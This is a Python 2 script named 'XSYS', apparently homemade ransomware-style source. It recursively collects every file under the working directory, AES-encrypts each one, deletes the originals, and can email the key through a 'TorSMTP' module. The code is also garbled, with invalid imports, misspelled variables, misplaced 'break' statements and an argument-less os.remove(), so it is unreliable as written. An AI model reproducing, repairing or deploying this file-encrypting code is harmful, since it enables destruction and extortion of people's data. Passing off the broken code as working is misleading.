#!/usr/bin/python


from smtp import * as SMTP
from loader import * as LOADER
import os, sys, platform, random, pkg_resources
from Crypto.Hash import SHA256
from Crypto.Cipher import AES



# clear console
def clear_console():

    p = platform.platform() # indentiy OS paltform - Windows, Linux, Darwin
    win = []
    linux = []
    drw = []

    if p.startswith('Win') or p.startswith('win'):   # check if namespace starts with Win || win
       win = lambda: os.system('cls')                #return prompt command  to clear the console screen 
       return win()

    elif p.startswith('Lin') or p.startswith('lin'): # Lin || lin
       linux = lambda: os.system('clear')
       return linux()
    else:
       drw = lambda: os.system('clean')              # Mac || IBM
       return drw()



# encrypt files
# Parmas:
# key <= password
# filename <= filename
def encrypt(key, filename):
    chunkSize = 65 * 1024       # size of data char encrypted 65,792 bytes
    outFile = os.path.join(os.path.dirname(filename), ".(encrypted)"+os.path.basename(filename)) # add marker to filename
    fileSize = str(os.path.getsize(filename)).zfill(16) # get the size of filename and fill with 16 bytes binary of zeros
    IV = ''  # initialize vector - randomize cipher modes

    for i in range(16):
        IV += chr(random.randint(0, 0xFF))        # random ASCII 0-255 chars into IV

    encrypter = AES.new(key, AES.MODE_CBC, IV)    # append (password, encryption in char.cipher.blocks ,randomize IV

    with open(filename, 'rb') as infile:          # as we opend filename > readbinary code
         with open(oudFile, 'wb') as outfile:     # stream binary code of filename and randIV into outfile 
              outfile.write(filename)
              oufile.write(IV)
              while True:
                    chunk = infile.read(chunkSize)      # append 65,792 byte encryption stream file into chunk

                    if len(chunk) == 0:                      # exit in chunk bytes equal to 0
                        break

                    elif len(chunk) % 16 != 0:               # if length of stream file size is 4bit and not equal to 0
                         chunk += ' ' * (16 - (len(chunk) % 16)) # fake size of encrypted file stream

                    outfile.write(encryptor.encrypt(chumk))  # write encrypted data into outfile




# decrypt files  <FBI's Part>
# paramas:
# key <= password
# filename <= filename
def decrypt(key, filename):
    outFile = os.path.join(os.path.dirname(filename), os.path.basename(filename[12:])) # stream filename to outFile 
    chunkSize = 64 * 1028                         # size of data char encrypted 65,792 bytes
    with open(filename, 'rb') as infile:          # as we opend filename > readbinary code
         fileSize = infile.read(16)               # read 16 encypted chars and append to fileSize
         IV = infile.read(16)                     # stream 16 char randomized IV into IV

    decryptor = AES.new(key, AES.MODE_CBC, IV)    # append password into IV  and decipher its using char.cipher.blocks

    with open(outFile, 'wb') as outfile:
         while True:
               chunk = infile.read(chunkSize)
               if len(chunk) == 0:
                  break

               outfile.write(decryptor.decrypt(chunk))   # decrypt the encrypted file

         outfile.truncate(int(fileSize))  # stream and sort the ASCII numeric value of chars decrypted chars



# main function  <init cgi to user and main program>

""" 
   # create a Hierarchical Tree that index any file in the system
   # using: tree height = (nodes^2+1) -1 <leafs simplify as -1 due to LEFT and RIGHT NULL equation>

                       ###################
                       # NOT INITIALIZED #
                       ###################

    def create_list_recursively(tree, items=[], queue=[]):

        if not items and not queue:
           return create_list_recursively(None, [], tree[])

        copy = queue[:]
        queue = []

        for item in  copy:
            if item is None:
               items.append(None)
               queue.append(None)
               queue.appden(None)
            else:
               items.append(item.key)
               queue.append(item.left)
               queue.append(item.right)

        if all((x is None for x in queue)):
           return items

        return create_list_recursively(items, queue)
""" 
def main():
      allFiles = []                                        # init allFiles as array
      for root, subfiles, files in os.walk(os.getcwd()):   # scan for the current working directory of the process
          for names in files:                              # run through all the filenames
              allFiles.append(os.path.join(root, names))   # add filenames full path in to allFiles Array

      return allFiles                                      # return the files list from allFiles Array


      clear_console()                                      # clear the console screen

# print the programs menu
print "\n\t\t################################"
print "\t\t## ~~~~~~~~ XSYS 1.0 ~~~~~~~~ ##"
print "\t\t##   Encrypt   ||   Decrypt   ##"
print "\t\t## ~~~~~~~~~~~~~~~~~~~~~~~~~~ ##"
print "\t\t## .....M.a.d.e....B.y....... ##"
print "\t\t##    Yahav   N   Hoffmann    ##"
print "\t\t##            A.K.A.          ##"
print "\t\t## T 0 x 1 c  E n v 3 1 o p e ##"
print "\t\t################################"
print ""    
print ""    
print " ATTENTION !!! "
print ""    
print " This program may cause harm to your computer files system, machine functionality,"
print " personal data and private information."
print ""    
print " XSYS is a tool that build an Hierarchical Tree diagram of"
print " all files from your root folder and its descendants until its (E)ncrypt || (D)ecrypt any leaf"
print " in the system tree diagram.\n"

choice = raw_input(" Do you want to (E)ncrypt or (D)ecrypt? ")
# password = raw_input(" Enter encryption key: ")  <-  move into the condition blocks

encFiles = main()                                 # run main function recursively

if choice == "E":                                              # if choose "E"
 password = raw_input(" Enter encryption key: ")             # get keyinput from user

 #####################
 ##   New Section   ##############################
 ## - SMTP service that send your Encryptio Key ##
 ## - back to your personal EMAIL.              ##
 #################################################
 print "[!] You can send the encryption key to your personal email\n    via our TorSMTP configuration."
 _choice = raw_input("Would you like to send the Encryption Key? Y/N ")
 if _choice == "Y":                         # if choose "Y"
  print "[+] Enter Email Information: "     # interact with user 
  email = raw_input("Email: ")              # get user input to email
  LOADER._loader.start()                    # start loader animatio thread
  LOADER._loader.sleep(10)                  # Animation Runtime
  LOADER._loader._done = True               # kill animation thread
  SMTP.sendMail(email, password)            # send email to `email` with theh encryption key
  break                                     # exit condition
 elif _choice == "N":                       # in choose "N"
  break                                     # exit condition

 for Tfiles in endFiles:                                     # run through all target files in encrypted file list
     if os.path.basename(Tfiles).startswith(".(encrypted)"): # check if add marker to filename exist
        print " %s is already encrypted" %str(Tfiles)        # print to user
        pass        # move in

     elif Tfiles == os.path.join(os.getcwd(), sys.argv[0]):  # check if target files equal to current runing process folders input
        pass        # move on
     else:
        encrypt(SHA256.new(password).digest(), str(Tfiles))  # digest the keyinput from target files and encrypt it using SHA256 key
        print " Done encrypting %s" %str(Tfiles)      # print the encrypted files results
        os.remove()                                   # remove the original files

elif choice == "D":                                            # if choose "D"
   filename = raw_input(" Enter the filename to decrypt: ")  # get filname from user
   pasword = raw_input(" Enter decryption key: ")            # get keyinput from user
   if not os.path.exists(filename):                          # check if filenames path exists
       print " The file does not exist"               # print message to user
       sys.exit(0)   # exit the program
   elif not filename.startswith(".(encrypted)"):             # check if add marker to filename exist
       print " %s is already not encrypted" %filename # print message to user
       sys.exit()    # exit the program
   else:
       decrypt(SHA256.new(password).digest(), filename)      # digest the keyinput from target files and decrypt it using SHA256 key
       print " Done decrypting %s " %filename         # print message to user
       os.remove(filename)                            # remove the encrypted file

else:
   print " Please choose a valid choice."             # print message to user
   sys.exit()        # exit the program

